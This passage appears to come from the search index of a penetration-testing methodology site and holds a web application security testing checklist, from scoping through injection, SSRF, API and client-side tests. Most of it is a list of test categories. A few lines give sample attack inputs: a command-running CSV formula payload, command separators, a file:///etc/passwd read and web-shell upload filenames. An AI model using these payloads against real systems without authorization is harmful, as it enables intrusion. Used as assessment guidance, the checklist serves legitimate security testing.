(e.g., SID filtering disabled).</li> </ul> </li> <li>Abusing <code>**krbtgt**</code> account synchronization across trusts.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/","title":"Web Application","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#i-planning-reconnaissance-information-gathering-pre-engagement-pre-exploitation","title":"I. Planning, Reconnaissance &amp; Information Gathering (Pre-Engagement &amp; Pre-Exploitation)","text":"<ul> <li>A. Scoping &amp; Rules of Engagement<ul> <li>Define Target URLs/Applications/APIs</li> <li>Define Testing Scope (e.g., specific functionalities, subdomains, out-of-scope areas)</li> <li>Define Objectives (e.g., identify OWASP Top 10, specific data exfiltration, RCE)</li> <li>Define Allowed/Disallowed Test Types (e.g., DoS/DDoS, aggressive scanning, social engineering of app users)</li> <li>Define Testing Window &amp; Blackout Periods</li> <li>Establish Communication Channels &amp; Escalation Paths</li> <li>Obtain Explicit Written Authorization</li> <li>Identify Test Accounts (roles: unauthenticated, authenticated user, admin, etc.)</li> <li>Discuss Incident Response Plan (client-side) if critical issues are found</li> <li>NDA and Legal Agreements in Place</li> <li>Understand Business Logic and Critical Workflows</li> </ul> </li> <li>B. Passive Reconnaissance (OSINT &amp; Non-Intrusive)<ul> <li>Identify Hosting Provider &amp; IP Addresses</li> <li>Gather DNS Information (A, CNAME, MX, TXT, SPF, DMARC, DKIM)</li> <li>Subdomain Enumeration (Search engines, DNSDumpster, VirusTotal, Sublist3r, Amass,crt.sh)</li> <li>Identify Related Domains &amp; Acquired Company Applications</li> <li>Search Engine Dorking (Google, Bing, DuckDuckGo) for:<ul> <li>Login Pages</li> <li>Admin Portals</li> <li>Error Messages</li> <li>Exposed Files (config, logs, backups, documents)</li> <li>Sensitive Information in Public Documents/Metadata</li> <li>API Endpoints in JavaScript files</li> </ul> </li> <li>Analyze Publicly Available Code Repositories (GitHub, GitLab, Bitbucket) for:<ul> <li>Hardcoded Credentials</li> <li>API Keys</li> <li>Sensitive Logic/Endpoints</li> <li>Vulnerable Code Snippets</li> </ul> </li> <li>Check Web Archive (Archive.org, other caches) for:<ul> <li>Old Versions of Pages</li> <li>Previously Exposed Information or Endpoints</li> <li>Changes in Technology Stack</li> </ul> </li> <li>Analyze SSL/TLS Certificates (Subject Alternative Names, Issuer, Validity, Certificate Transparency Logs)</li> <li>Identify Technologies Used (Wappalyzer, WhatWeb, BuiltWith):<ul> <li>Web Server (Apache, Nginx, IIS, etc.)</li> <li>Backend Language/Framework (PHP, Java/Spring, Python/Django, Node.js/Express, Ruby/Rails, ASP.NET)</li> <li>Frontend Frameworks/Libraries (React, Angular, Vue.js, jQuery)</li> <li>Content Management System (CMS) (WordPress, Joomla, Drupal, etc.) &amp; Plugins/Themes</li> <li>Web Application Firewall (WAF) Detection (WAFW00F)</li> <li>Analytics &amp; Marketing Tools</li> </ul> </li> <li>Search for Publicly Reported Vulnerabilities for Identified Technologies</li> <li>Analyze <code>robots.txt</code> and <code>sitemap.xml</code></li> <li>Check for Information Disclosure in HTTP Headers</li> <li>Social Media &amp; Forum Research for Employee Posts or Application Mentions</li> <li>Pastebin/Dark Web searches for leaked credentials or data related to the target</li> </ul> </li> <li>C. Active Reconnaissance (Light Interaction)<ul> <li>Manual Site Crawling &amp; Exploration (as a user)</li> <li>Identify Application Entry Points (Login, Registration, Search, Contact Forms, File Uploads)</li> <li>Identify Application Exit Points (Data Display, Exports, API Responses)</li> <li>Automated Spidering/Crawling (Burp Suite, ZAP, Screaming Frog - respect <code>robots.txt</code> unless permitted to ignore)</li> <li>Directory &amp; File Brute-Forcing (Gobuster, Dirb, Feroxbuster, ffuf) for:<ul> <li>Admin Interfaces</li> <li>Backup Files (<code>.bak</code>, <code>.old</code>, <code>.zip</code>, <code>~</code>)</li> <li>Configuration Files (<code>web.config</code>, <code>.env</code>, <code>wp-config.php</code>)</li> <li>Source Code Files (<code>.java</code>, <code>.php</code>, <code>.cs</code>, <code>.py</code>)</li> <li>Log Files</li> <li>Temporary Files</li> <li>Exposed API Endpoints (common paths, Swagger/OpenAPI definitions)</li> </ul> </li> <li>Virtual Host Enumeration (if multiple apps on same IP)</li> <li>Fingerprint Web Server Further (HTTP methods, error pages, specific version probes)</li> <li>Light Port Scanning on Web Server IP (common web ports: 80, 443, 8000, 8080, etc.)</li> <li>Identify Default Credentials for Known Technologies (e.g., Tomcat Manager, JBoss Console)</li> <li>Analyze JavaScript Files for:<ul> <li>API Endpoints</li> <li>Hidden Parameters</li> <li>Sensitive Logic</li> <li>Comments with sensitive info</li> <li>Weak Cryptographic Usage</li> <li>DOM XSS Sinks &amp; Sources</li> </ul> </li> <li>Check for Source Code Disclosure (e.g., <code>.git</code> folder, <code>.DS_Store</code>, SVN entries)</li> <li>Check for Client-Side Storage (Local Storage, Session Storage, Cookies, IndexedDB) for sensitive data</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#ii-threat-modeling-vulnerability-analysis","title":"II. Threat Modeling &amp; Vulnerability Analysis","text":"<ul> <li>A. Identify Key Assets &amp; Trust Boundaries:<ul> <li>User Data (PII, credentials, financial info)</li> <li>Application Data (business secrets, intellectual property)</li> <li>Session Tokens</li> <li>Admin Functionality</li> <li>Backend Systems (databases, internal APIs)</li> </ul> </li> <li>B. Analyze Application Architecture:<ul> <li>Client-Side vs. Server-Side Logic</li> <li>Single Page Application (SPA) vs. Traditional Multi-Page Application (MPA)</li> <li>API Usage (internal, external, third-party)</li> <li>Data Flow Diagrams (how data is processed, stored, transmitted)</li> <li>Authentication &amp; Authorization Mechanisms</li> </ul> </li> <li>C. Map Attack Surface:<ul> <li>All HTTP(S) Endpoints (GET, POST, PUT, DELETE, etc.)</li> <li>All Input Parameters (URL, query string, headers, body - JSON, XML, form-data)</li> <li>File Upload Functionality</li> <li>User-Controllable Data in Headers (Referer, User-Agent, Custom Headers)</li> <li>WebSockets / Server-Sent Events</li> <li>Third-Party Integrations &amp; Libraries</li> </ul> </li> <li>D. Automated Vulnerability Scanning (with caution and verification):<ul> <li>Dynamic Application Security Testing (DAST) tools (Burp Suite Pro, OWASP ZAP, Acunetix, Netsparker)</li> <li>Content Management System (CMS) specific scanners (WPScan, JoomScan, Droopescan)</li> <li>API specific scanners</li> <li>JavaScript library vulnerability scanners (Retire.js)</li> <li>Review and Manually Verify All Scanner Findings (critical to eliminate false positives)</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#iii-authentication-testing","title":"III. Authentication Testing","text":"<ul> <li>A. Enumeration:<ul> <li>User Enumeration via Login Page (different error messages for valid/invalid users)</li> <li>User Enumeration via Password Reset Page</li> <li>User Enumeration via Registration Page (username already exists)</li> <li>User Enumeration via API endpoints</li> </ul> </li> <li>B. Password Policy:<ul> <li>Check for Minimum/Maximum Length Requirements</li> <li>Check for Complexity Requirements (uppercase, lowercase, numbers, symbols)</li> <li>Check for Password History Restriction</li> <li>Check for Password Expiration &amp; Forced Reset</li> <li>Check against Common Password Lists / Dictionary Attacks</li> <li>Check for Easily Guessable \"Hint\" Questions/Answers</li> </ul> </li> <li>C. Brute-Force Attacks:<ul> <li>Login Form Brute-Force (users, passwords)</li> <li>Password Reset Token Brute-Force</li> <li>CAPTCHA Bypass/Weakness Testing</li> <li>Account Lockout Mechanism Testing (existence, threshold, duration, reset)</li> <li>Rate Limiting on Authentication Attempts</li> <li>Multi-Factor Authentication (MFA/2FA) Token Brute-Force (if applicable)</li> </ul> </li> <li>D. Credentials Transport &amp; Storage:<ul> <li>Credentials Sent Over HTTPS (no HTTP)</li> <li>Autocomplete Prevention on Password Fields (<code>autocomplete=\"off\"</code> or <code>\"new-password\"</code>)</li> <li>No Hardcoded Credentials in Client-Side Code</li> <li>No Default Credentials for Admin/Test Accounts</li> <li>Secure Password Storage (hashing with strong algorithm and salt, e.g., Argon2, scrypt, bcrypt, PBKDF2)</li> </ul> </li> <li>E. Session Management for Authentication:<ul> <li>Session Token Generation (randomness, length, uniqueness)</li> <li>Session Token Transmission (HTTPS only, HttpOnly flag, Secure flag for cookies)</li> <li>Session Timeout (idle and absolute)</li> <li>Session Fixation Vulnerabilities</li> <li>Session Hijacking (if tokens are predictable or exposed)</li> <li>Secure Logout (session invalidated server-side)</li> <li>Concurrent Session Management</li> <li>\"Remember Me\" Functionality Security (long-lived tokens, secure storage)</li> </ul> </li> <li>F. Multi-Factor Authentication (MFA/2FA):<ul> <li>MFA Bypass Techniques (e.g., response manipulation, backup code issues)</li> <li>Weak OTP Generation/Validation</li> <li>Information Disclosure of MFA Status</li> <li>MFA Trust Mechanisms (e.g., trust this device) and their bypasses</li> <li>Brute-forcing recovery codes</li> <li>Social engineering MFA codes</li> </ul> </li> <li>G. OAuth / OpenID Connect / SAML Testing:<ul> <li>Weak Redirect URI Configuration (Open Redirect, token theft)</li> <li>CSRF on Authorization Flow (<code>state</code> parameter misuse)</li> <li>Authorization Code Interception / Replay</li> <li>Implicit Grant Flow Misuse (token leakage via browser history/Referer)</li> <li>JWT Vulnerabilities (alg=none, weak secrets, public key confusion, <code>kid</code> injection)</li> <li>SAML Assertion Tampering, Signature Wrapping, XML Injection</li> <li>Insufficient Scope Validation</li> <li>Client Secret Leakage</li> </ul> </li> <li>H. Password Reset &amp; Account Recovery:<ul> <li>Token Generation (randomness, expiry, single-use)</li> <li>Token Leakage (e.g., in URL, via Referer header)</li> <li>Information Disclosure During Reset Process (e.g., confirming email existence)</li> <li>Host Header Injection for Password Reset Links</li> <li>No Link Between Session and Reset Process</li> <li>Email/SMS Verification Code Brute-Force/Bypass</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#iv-authorization-testing","title":"IV. Authorization Testing","text":"<ul> <li>A. Horizontal Privilege Escalation:<ul> <li>Accessing Data/Functionality of Other Users with Same Role</li> <li>Modifying Identifiers in URLs, POST data, Headers, Cookies (IDOR)</li> <li>Testing All Functions with User A's Session, Then User B's Identifiers</li> </ul> </li> <li>B. Vertical Privilege Escalation:<ul> <li>Accessing Admin/Higher-Privileged Functionality with Lower-Privileged User Session</li> <li>Forced Browse to Admin URLs</li> <li>Parameter Tampering to Invoke Privileged Functions</li> <li>Exploiting Chained Vulnerabilities to Elevate Privileges</li> </ul> </li> <li>C. Insecure Direct Object References (IDOR):<ul> <li>Testing for IDOR in GET/POST parameters, JSON bodies, Cookies, Headers</li> <li>Testing with numeric IDs, GUIDs, usernames, filenames</li> <li>Checking for IDOR in API endpoints</li> <li>Testing for IDOR in multi-tenant applications</li> </ul> </li> <li>D. Missing Function-Level Access Control:<ul> <li>Directly Calling Privileged Functions/API Endpoints Without Proper Checks</li> <li>Accessing Admin Panels/Functions While Authenticated as a Regular User</li> </ul> </li> <li>E. Role-Based Access Control (RBAC) Bypass:<ul> <li>Manipulating Role Parameters</li> <li>Exploiting Flaws in Role Assignment Logic</li> <li>Path Traversal to Access Restricted Resources Based on Role</li> </ul> </li> <li>F. Client-Side Authorization Control Bypass:<ul> <li>Disabling JavaScript</li> <li>Modifying JavaScript Variables</li> <li>Intercepting and Modifying Requests in Burp/ZAP to Bypass Client-Side UI Restrictions</li> </ul> </li> <li>G. Insecure API Authorization:<ul> <li>Missing or Weak API Key/Token Validation</li> <li>Broken Object Level Authorization (BOLA) in APIs</li> <li>Broken Function Level Authorization (BFLA) in APIs</li> <li>Mass Assignment leading to privilege escalation via API</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#v-session-management-testing","title":"V. Session Management Testing","text":"<ul> <li>A. Session Token Properties:<ul> <li>Meaningful Session Tokens (avoid sequential or easily guessable tokens)</li> <li>Session Token Length and Entropy</li> <li><code>HttpOnly</code> Flag on Cookies</li> <li><code>Secure</code> Flag on Cookies</li> <li><code>SameSite</code> Attribute (Lax, Strict, None) on Cookies &amp; CSRF implications</li> <li>Cookie Path and Domain Scope (<code>Path=/</code>, <code>Domain=</code>) - ensure not too broad</li> <li>Cookie Expiration and <code>Max-Age</code></li> </ul> </li> <li>B. Session Lifecycle:<ul> <li>Session Invalidation on Logout</li> <li>Session Invalidation on Password Change/Reset</li> <li>Session Invalidation on Idle Timeout</li> <li>Session Invalidation on Absolute Timeout</li> <li>Session Renewal Mechanisms (sliding sessions) security</li> <li>Handling of Concurrent Logins (allow, disallow, notify)</li> </ul> </li> <li>C. Session Puzzling/Fixation:<ul> <li>Forcing Session IDs via GET/POST Parameters or Headers</li> <li>Session Fixation Before Authentication</li> <li>Session Adoption Vulnerabilities</li> </ul> </li> <li>D. Cross-Site Request Forgery (CSRF):<ul> <li>Absence of Anti-CSRF Tokens for State-Changing Requests</li> <li>Weak Anti-CSRF Token Implementation (not tied to session, predictable, reusable)</li> <li>CSRF on Login/Logout Forms (less common but possible impact)</li> <li>Testing for CSRF in AJAX requests</li> <li>Testing for CSRF with different HTTP methods (GET, POST, PUT, DELETE)</li> <li>Use of <code>SameSite</code> cookie attribute as a defense and its limitations</li> </ul> </li> <li>E. JSON Web Token (JWT) Specifics:<ul> <li><code>alg:none</code> vulnerability</li> <li>HMAC with Public Key (Algorithm Confusion)</li> <li>Weak Secret Keys (brute-forceable)</li> <li><code>kid</code> parameter injection / path traversal</li> <li>Sensitive data in JWT payload (non-encrypted)</li> <li>Lack of <code>exp</code> (expiration) claim or improper validation</li> <li><code>iat</code> (issued at) and <code>nbf</code> (not before) claim validation</li> <li>JKU/X5U header vulnerabilities (SSRF to fetch malicious keys)</li> <li>Replay attacks if <code>jti</code> (JWT ID) is not used or validated for uniqueness</li> <li>Signature stripping</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#vi-input-validation-sanitization-testing-injection-vulnerabilities","title":"VI. Input Validation &amp; Sanitization Testing (Injection Vulnerabilities)","text":"<ul> <li>A. Cross-Site Scripting (XSS):<ul> <li>Reflected XSS:<ul> <li>Testing all input fields, URL parameters, HTTP headers</li> <li>Using various XSS payloads (script tags, event handlers, different encodings)</li> <li>Testing in HTML context, JavaScript context, attribute context, URL context</li> </ul> </li> <li>Stored XSS:<ul> <li>Testing inputs that are stored and later displayed (comments, profiles, forum posts, filenames)</li> <li>Testing for second-order stored XSS (data stored via one function, XSS triggers via another)</li> </ul> </li> <li>DOM-based XSS:<ul> <li>Identifying sources (e.g., <code>location.hash</code>, <code>document.referrer</code>) and sinks (e.g., <code>innerHTML</code>, <code>document.write</code>, <code>eval</code>)</li> <li>Manually crafting payloads targeting DOM manipulation</li> <li>Using browser developer tools to trace data flow</li> </ul> </li> <li>Blind XSS:<ul> <li>Injecting payloads into backend systems (e.g., log viewers, admin panels) that might trigger later</li> <li>Using XSS Hunter or similar services</li> </ul> </li> <li>XSS Filter Evasion Techniques:<ul> <li>Encoding (HTML entities, URL encoding, Base64)</li> <li>Case variations</li> <li>Null bytes</li> <li>Obfuscated JavaScript</li> <li>Using less common event handlers/tags</li> </ul> </li> <li>Content Security Policy (CSP) Analysis &amp; Bypass:<ul> <li>Review CSP headers for misconfigurations (<code>unsafe-inline</code>, <code>unsafe-eval</code>, overly broad sources)</li> <li>JSONP abuse for CSP bypass</li> <li>Dangling markup injection</li> </ul> </li> </ul> </li> <li>B. SQL Injection (SQLi):<ul> <li>In-band SQLi:<ul> <li>Error-based (forcing database errors revealing data/schema)</li> <li>Union-based (combining results from another table)</li> </ul> </li> <li>Inferential (Blind) SQLi:<ul> <li>Boolean-based (observing true/false responses)</li> <li>Time-based (injecting delays to infer data)</li> </ul> </li> <li>Out-of-band SQLi:<ul> <li>Using database functions to exfiltrate data via DNS, HTTP requests (e.g., <code>xp_dirtree</code>, <code>UTL_HTTP</code>, <code>LOAD_FILE</code>)</li> </ul> </li> <li>Testing Locations:<ul> <li>URL Parameters (GET)</li> <li>Form Fields (POST)</li> <li>HTTP Headers (Cookie, User-Agent, Referer, Custom Headers)</li> <li>JSON/XML Payloads</li> <li>Stored Procedures / Second Order SQLi</li> </ul> </li> <li>Database Specific Payloads:<ul> <li>MySQL, MSSQL, PostgreSQL, Oracle, SQLite</li> </ul> </li> <li>WAF Bypass Techniques for SQLi:<ul> <li>Comments, whitespace, case variations, encoding, null bytes, alternative syntax</li> </ul> </li> <li>NoSQL Injection:<ul> <li>Targeting MongoDB, CouchDB, etc.</li> <li>Operator injection (<code>$gt</code>, <code>$ne</code>, <code>$where</code>), JavaScript injection</li> </ul> </li> </ul> </li> <li>C. OS Command Injection:<ul> <li>Testing inputs used in system commands (filenames, user inputs to scripts)</li> <li>Using command separators (<code>;</code>, <code>|</code>, <code>&amp;&amp;</code>, <code>||</code>, <code>\\n</code>, <code>`</code>)</li> <li>Blind command injection techniques (time delays, output redirection to webroot, out-of-band)</li> <li>Testing file upload functionalities for command injection via filenames or metadata</li> </ul> </li> <li>D. LDAP Injection:<ul> <li>Testing inputs used in LDAP queries (login forms, search functions)</li> <li>Using LDAP metacharacters (, <code>(</code>, <code>)</code>, <code>\\</code>, <code>&amp;</code>, <code>|</code>, <code>!</code>)</li> </ul> </li> <li>E. XPath Injection / XXE (XML External Entity) Injection:<ul> <li>XPath Injection:<ul> <li>Testing inputs used in XPath queries in XML-based applications</li> </ul> </li> <li>XXE Injection:<ul> <li>Testing XML parsers for XXE vulnerabilities (file uploads, SOAP requests, other XML inputs)</li> <li>Exploiting XXE for:<ul> <li>File disclosure (<code>file:///etc/passwd</code>)</li> <li>SSRF (accessing internal resources)</li> <li>Denial of Service (billion laughs attack)</li> <li>Port scanning internal networks</li> </ul> </li> <li>Testing for out-of-band XXE</li> </ul> </li> </ul> </li> <li>F. Server-Side Template Injection (SSTI):<ul> <li>Identifying template engines (Jinja2, Twig, Freemarker, Velocity, ERB, etc.)</li> <li>Using polyglot payloads to detect SSTI</li> <li>Crafting payloads for RCE or information disclosure based on the identified engine</li> <li>Testing in user profiles, custom templates, email generation, PDF generation</li> </ul> </li> <li>G. HTTP Header Injection / Response Splitting:<ul> <li>Injecting <code>CRLF</code> characters (<code>\\r\\n</code>) into headers controlled by user input</li> <li>Testing for cache poisoning, XSS, session fixation via header injection</li> <li>Testing for HTTP Response Splitting</li> </ul> </li> <li>H. NoSQL Injection (Re-iterated for specific focus):<ul> <li>Check if user inputs directly construct NoSQL queries</li> <li>Try injecting NoSQL operators (e.g., MongoDB: <code>$ne</code>, <code>$regex</code>, <code>$where</code> for JS execution)</li> <li>Test for data type manipulation that could lead to unexpected query behavior</li> </ul> </li> <li>I. Host Header Injection:<ul> <li>Manipulating the <code>Host</code> header for:<ul> <li>Password reset poisoning</li> <li>Cache poisoning</li> <li>SSRF against internal hosts that trust the Host header</li> <li>Accessing internal applications if a reverse proxy uses the Host header for routing</li> </ul> </li> </ul> </li> <li>J. CSV / Formula Injection:<ul> <li>Testing \"Export to CSV/Excel\" functionalities</li> <li>Injecting payloads like <code>=cmd|' /C calc'!A0</code> or <code>=HYPERLINK(...)</code> that execute when the CSV is opened</li> </ul> </li> <li>K. Insecure File Uploads:<ul> <li>Bypassing File Type Restrictions (magic bytes, extensions, <code>Content-Type</code> header)</li> <li>Uploading Web Shells (<code>.php</code>, <code>.asp</code>, <code>.jsp</code>, <code>.aspx</code>, <code>.phtml</code>)</li> <li>Uploading Files with Malicious Payloads (XSS in SVG, XXE in XML/DOCX)</li> <li>Directory Traversal on File Upload Path (<code>../../shell.php</code>)</li> <li>Double Extension Attack (<code>shell.php.jpg</code>)</li> <li>Null Byte Injection in Filename (<code>shell.php%00.jpg</code>)</li> <li>Testing for Race Conditions during file upload and processing</li> <li>Large File Upload DoS</li> <li>Pixel Flood Attack (ImageMagick/GraphicsMagick vulnerabilities)</li> <li>Antivirus Bypass for uploaded malware</li> <li>Overwriting existing critical files</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#vii-server-side-vulnerabilities","title":"VII. Server-Side Vulnerabilities","text":"<ul> <li>A. Server-Side Request Forgery (SSRF):<ul> <li>Identifying functionalities that make requests based on user input (URL fetchers, PDF generators, webhook integrations)</li> <li>Testing with <code>http://</code>, <code>https://</code>, <code>file:///</code>, <code>ftp://</code>, <code>gopher://</code>, <code>dict://</code> schemes</li> <li>Accessing internal IP addresses and ports (e.g., <code>127.0.0.1</code>, <code>169.254.169.254</code>, internal RFC1918 ranges)</li> <li>Interacting with cloud metadata services (AWS EC2, Azure IMDS, GCP Metadata Server)</li> <li>Bypassing SSRF defenses (blacklists, whitelists, open redirects)</li> <li>Blind SSRF detection techniques</li> </ul> </li> <li>B. Security Misconfigurations (Server Level):<ul> <li>Default Credentials (admin panels, databases, middleware)</li> <li>Directory Listing Enabled</li> <li>Verbose Error Messages Disclosing Sensitive Information (stack traces, paths, config details)</li> <li>Unnecessary Services/Features Enabled (e.g., debug modes, sample applications, HTTP methods like PUT/DELETE if not used)</li> <li>Outdated Software Versions (web server, OS, libraries - check for public CVEs)</li> <li>Misconfigured HTTP Headers (Missing <code>Strict-Transport-Security</code>, <code>Content-Security-Policy</code>, <code>X-Content-Type-Options</code>, <code>X-Frame-Options</code>, <code>Referrer-Policy</code>)</li> <li>Information Leakage via Headers (<code>Server</code>, <code>X-Powered-By</code>, <code>X-AspNet-Version</code>)</li> <li>Insecure Cross-Origin Resource Sharing (CORS) Configuration (<code>Access-Control-Allow-Origin: *</code> or reflecting origin)</li> <li>Open Ports for Unnecessary Services</li> <li>Weak SSL/TLS Configurations (old protocols like SSLv3/TLSv1.0/1.1, weak ciphers, BEAST, POODLE, Heartbleed, Sweet32)</li> <li>Exposed Management Interfaces (Tomcat Manager, JBoss Admin Console, phpMyAdmin)</li> <li>Insecure handling of <code>.git</code> directory or other VCS metadata</li> <li>Path Traversal at the Web Server Level (e.g., misconfigured aliases)</li> </ul> </li> <li>C. Using Components with Known Vulnerabilities:<ul> <li>Identifying all third-party libraries (client-side and server-side)</li> <li>Checking versions against vulnerability databases (NVD, CVE Details, Snyk, Retire.js for JS)</li> <li>Testing for known exploits for identified vulnerable components</li> </ul> </li> <li>D. Information Disclosure:<ul> <li>Sensitive Data in Comments (HTML, JS, CSS)</li> <li>Error Message Content (stack traces, database errors, internal paths)</li> <li>Backup Files (<code>.bak</code>, <code>.swp</code>, <code>.old</code>, <code>~</code>)</li> <li>Configuration Files Exposed (<code>.env</code>, <code>web.config</code>, <code>appsettings.json</code>)</li> <li>API Key Leakage (client-side code, public repositories, error messages)</li> <li>User Profile Information Leakage (e.g., via sequential IDs or search features)</li> <li>Debug Parameters revealing sensitive info (<code>?debug=true</code>)</li> </ul> </li> <li>E. Denial of Service (DoS) - Use with EXTREME caution and explicit permission:<ul> <li>Resource Exhaustion (CPU, memory, disk space) via legitimate-looking requests</li> <li>Regex DoS (ReDoS) in input validation</li> <li>XML Bomb / Billion Laughs (for XXE-vulnerable parsers)</li> <li>Large File Uploads</li> <li>Slow HTTP Attacks (Slowloris, Slow POST)</li> <li>Asymmetric Resource Consumption (e.g., password hashing, complex search queries)</li> <li>Logic flaws leading to resource exhaustion</li> <li>Testing for lack of rate limiting on expensive operations</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#viii-api-security-testing-rest-graphql-soap-websockets","title":"VIII. API Security Testing (REST, GraphQL, SOAP, WebSockets)","text":"<ul> <li>A. General API Vulnerabilities (Applicable to REST, GraphQL, etc.):<ul> <li>Broken Authentication (as per Section III)</li> <li>Broken Authorization (BOLA/IDOR, BFLA - as per Section IV)</li> <li>Excessive Data Exposure (API returning more data than necessary)</li> <li>Mass Assignment (binding client-controlled data to internal object properties without validation)</li> <li>Lack of Resources &amp; Rate Limiting (DoS, brute-force)</li> <li>Security Misconfiguration (verbose errors, default creds, CORS, HTTP headers)</li> <li>Injection Vulnerabilities (SQLi, NoSQLi, Command Inj. in API parameters)</li> <li>Improper Assets Management (e.g., old API versions still active and vulnerable, exposed dev/staging APIs)</li> <li>Insufficient Logging &amp; Monitoring (for detecting attacks)</li> </ul> </li> <li>B. REST API Specifics:<ul> <li>HTTP Method Tampering (e.g., using GET instead of POST, or PUT/DELETE when not intended)</li> <li>Insecure handling of <code>Content-Type</code> (e.g., expecting JSON but accepting XML leading to XXE)</li> <li>API Key Management (secure storage, rotation, privilege scoping)</li> <li>Parameter Pollution (HTTP Parameter Pollution - HPP)</li> <li>Unprotected API endpoints (especially for internal or sensitive operations)</li> <li>Versioning issues (e.g., <code>/v1/</code> vulnerable while <code>/v2/</code> is fixed)</li> </ul> </li> <li>C. GraphQL Specifics:<ul> <li>Introspection Query Enabled (allowing attackers to map the entire schema)</li> <li>Batching Attacks (sending multiple queries in one request to cause DoS)</li> <li>Circular Queries (DoS)</li> <li>Field Duplication (DoS)</li> <li>Deeply Nested Queries / Query Depth Limiting</li> <li>Alias Overloading</li> <li>Authorization Bypass via Nested Objects or mutations</li> <li>Suggestions Enabled (can leak field/type names)</li> <li>Injection within GraphQL arguments</li> </ul> </li> <li>D. SOAP API Specifics:<ul> <li>XML Injection / XXE in SOAP messages</li> <li>WSDL Enumeration and Analysis</li> <li>Replay Attacks with SOAP messages</li> <li>WS-Security Misconfigurations</li> </ul> </li> <li>E. WebSockets / Socket.IO Specifics:<ul> <li>Unauthenticated/Unauthorized Access to WebSocket Endpoints</li> <li>Cross-Site WebSocket Hijacking (CSWSH)</li> <li>Data Injection through WebSocket Messages (XSS, SQLi if data is processed insecurely)</li> <li>Lack of Message Encryption (if <code>wss://</code> is not used)</li> <li>Denial of Service via message flooding</li> <li>Weak origin validation</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#ix-business-logic-vulnerabilities","title":"IX. Business Logic Vulnerabilities","text":"<ul> <li>A. All<ul> <li>Identify Application Workflows (user registration, password reset, shopping cart, payment processing, approval chains)</li> <li>Test for Flaws in Multi-Stage Processes (e.g., skipping steps, manipulating state)</li> <li>Price Manipulation (tampering with prices in requests or client-side)</li> <li>Discount/Coupon Abuse</li> <li>Order Modification/Cancellation Flaws</li> <li>Approval Process Bypass</li> <li>Exploiting Race Conditions in Business Logic (e.g., redeeming a voucher multiple times)</li> <li>Feature Abuse (e.g., spamming via contact forms, review bombing)</li> <li>Unexpected Application State Manipulation</li> <li>Data Validation Flaws Beyond Security (e.g., allowing negative quantities)</li> <li>Information Leakage through Business Logic Flows</li> <li>Exploiting Trust Between Application Components</li> <li>Circumventing Workflow Rules</li> <li>Unauthorized Fund Transfers or Data Modification</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#x-cryptography-data-protection","title":"X. Cryptography &amp; Data Protection","text":"<ul> <li>A. All<ul> <li>Use of Weak or Deprecated Cryptographic Algorithms (MD5, SHA1 for hashing passwords, DES, RC4 for encryption)</li> <li>Insufficient Key Length or Weak Key Generation</li> <li>Hardcoded Cryptographic Keys in Client-Side or Server-Side Code</li> <li>Missing Encryption for Sensitive Data at Rest (databases, files)</li> <li>Missing Encryption for Sensitive Data in Transit (ensure TLS 1.2+ everywhere, strong ciphers)</li> <li>Predictable IVs (Initialization Vectors) or Nonce Reuse in Symmetric Encryption</li> <li>Padding Oracle Attacks (if CBC mode with PKCS#7 padding is used and error messages leak info)</li> <li>Insecure Random Number Generation for Security-Sensitive Values (session tokens, CSRF tokens, password reset tokens)</li> <li>Client-Side Cryptography Implementation Weaknesses (often easily bypassed)</li> <li>Information Leakage via Cryptographic Error Messages</li> <li>Data Masking Failures (e.g., credit card numbers not properly masked in logs or UI)</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#xi-error-handling-logging","title":"XI. Error Handling &amp; Logging","text":"<ul> <li>A. All<ul> <li>Verbose Error Messages (stack traces, internal paths, SQL errors, software versions)<ul> <li>Test different inputs, invalid parameters, unexpected data types</li> </ul> </li> <li>Generic vs. Specific Error Messages (avoid revealing too much, but provide enough for user understanding)</li> <li>Inconsistent Error Handling Across Application</li> <li>Improper Logging (sensitive data in logs - passwords, API keys, session tokens, PII)</li> <li>Insufficient Logging (not logging security-relevant events - logins, failed logins, access control failures, input validation failures)</li> <li>Logs Accessible by Unauthorized Users</li> <li>Log Injection / Log Forging (injecting fake log entries or CRLF to break log format)</li> <li>Error Codes that Reveal Too Much Information</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#xii-client-side-security-beyond-dom-xss","title":"XII. Client-Side Security (Beyond DOM XSS)","text":"<ul> <li>A. All<ul> <li>Insecure Use of <code>postMessage()</code> API (missing origin validation, data validation)</li> <li>Insecure Data Storage in Browser (Local Storage, Session Storage, Cookies - check for sensitive info)</li> <li>Client-Side URL Redirects (Open Redirect if user input controls destination without validation)</li> <li>Clickjacking / UI Redressing (ensure <code>X-Frame-Options</code> or <code>CSP frame-ancestors</code> are used)</li> <li>Cross-Origin Resource Sharing (CORS) Misconfigurations allowing unauthorized origins</li> <li>Subresource Integrity (SRI) Not Used for External JS/CSS</li> <li>Outdated or Vulnerable JavaScript Libraries (Retire.js)</li> <li>Improperly Sanitized Data Displayed from Client-Side Storage</li> <li>WebAssembly (WASM) vulnerabilities (if used, memory corruption, logic flaws)</li> <li>Service Worker vulnerabilities (interception, cache poisoning)</li> </ul> </li> 